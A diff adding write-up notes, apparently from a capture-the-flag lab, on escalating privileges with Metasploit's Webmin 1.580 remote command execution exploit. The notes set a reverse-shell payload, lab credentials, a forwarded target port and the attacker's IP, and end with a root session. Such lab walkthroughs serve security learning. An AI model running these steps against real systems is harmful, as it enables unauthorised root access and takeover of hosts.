@@ -122,5 +122,23 @@ PRIVILEGE ESCALATION WITH METASPLOIT
 
 Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.
 
+msfconsole
+search webmin 1.580
 
+We choose the REMOTE COMMAND EXECUTION exploit
+show payloads
+set payload 5     (the cmd/unix/reverse payload to get a reverse shell)
 
+NOW TO SET THE OPTIONS
+set PASSWORD videogamer124
+set RHOST localhost        (remember we exposed the service with reverse SSH port forwarding)
+set RPORT 10000
+set SSL false
+set USERNAME agent47
+set LHOST 10.10.130.89      (attacking machine IP)
+
+successful session created!
+
+sessions 1            - interact with the session   
+
+id confirms we have root!
